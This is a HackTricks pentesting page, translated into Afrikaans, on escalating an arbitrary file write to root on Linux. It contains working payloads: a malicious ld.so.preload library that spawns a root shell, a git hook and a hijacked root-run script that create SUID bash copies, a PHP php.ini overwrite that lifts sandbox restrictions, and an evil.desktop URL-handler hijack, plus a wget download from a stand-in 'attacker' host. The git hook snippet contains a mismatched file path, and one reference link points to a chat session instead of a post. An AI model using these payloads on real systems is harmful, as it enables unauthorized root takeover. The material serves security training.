# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer tree op soos die **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID binaries**.\
As jy dit kan skep of wysig, kan jy eenvoudig 'n **pad na 'n biblioteek wat met elke uitgevoerde binary gelaai sal word** byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat op verskeie **gebeurtenisse** in 'n git repository **uitgevoer** word, soos wanneer 'n commit geskep word, 'n merge...

So if a **bevoorregte skrip of gebruiker** hierdie aksies gereeld uitvoer en dit moontlik is om in die **`.git`-map** te **skryf**, kan dit gebruik word om **privesc**.

Byvoorbeeld, dit is moontlik om 'n **skrip te genereer** in 'n git repo in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Tyd-lêers

Nog te doen

### Diens & Socket-lêers

Nog te doen

### Oorskryf 'n beperkende `php.ini` wat deur 'n bevoorregte PHP sandbox gebruik word

Sommige pasgemaakte daemons valideer gebruikers-verskafte PHP deur `php` met 'n **beperkte `php.ini`** te laat loop (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed kode steeds **enige skryfprimitive** het (soos `file_put_contents`) en jy die **presiese `php.ini`-pad** wat deur die daemon gebruik word kan bereik, kan jy daardie konfigurasie **oorskryf** om beperkings op te hef en dan 'n tweede payload indien wat met verhoogde voorregte loop.

Tipiese vloei:

1. Eerste payload oorskryf die sandbox-konfigurasie.
2. Tweede payload voer kode uit nou dat gevaarlike funksies weer geaktiveer is.

Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
As die daemon as root loop (of valideer met paadjies wat aan root behoort), produseer die tweede uitvoering 'n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime nog steeds lêers kan skryf.

### binfmt_misc

Die lêer in `/proc/sys/fs/binfmt_misc` dui aan watter binary watter tipe lêers moet uitvoer. TODO: kyk na die vereistes om dit te misbruik om 'n rev shell uit te voer wanneer 'n algemene lêertipe oop is.

### Oorskryf skema-handelaars (soos http: of https:)

'n Aanvaller met skryfregte tot 'n slagoffer se konfigurasiedirektore kan maklik lêers vervang of skep wat stelselsgedrag verander, wat uiteindelik in onbedoelde kode-uitvoering lei. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-handelaars na 'n kwaadaardige lêer te wys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **'n klik op enige http- of https-skakel die kode in daardie `evil.desktop`-lêer aktiveer**. Byvoorbeeld, nadat die volgende kwaadaardige kode in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, sal enige eksterne URL-klik die ingebedde opdrag uitvoer:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Vir meer inligting, kyk na [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om 'n werklike vulnerability te exploit.

### Root wat deur gebruiker skryfbare scripts/binaries uitvoer

Indien 'n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` (of enige binary binne 'n gids wat behoort aan 'n onbevoorregte gebruiker) uitvoer, kan jy dit kap:

- **Ontdek die uitvoering:** moniteer prosesse met [pspy](https://github.com/DominicBreuker/pspy) om te vang wanneer root user-controlled paths aanroep:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** verseker dat beide die teikenlêer en die gids daarvan deur jou gebruiker besit is en geskryf kan word.
- **Hijack the target:** rugsteun die oorspronklike binary/script en drop 'n payload wat 'n SUID shell (of enige ander root action) skep, en herstel dan permissies:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Aktiveer die bevoorregte aksie** (bv., druk 'n UI-knoppie wat die helper spawn). Wanneer root die hijacked path weer uitvoer, gryp die escalated shell met `./rootshell -p`.

## Verwysings

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
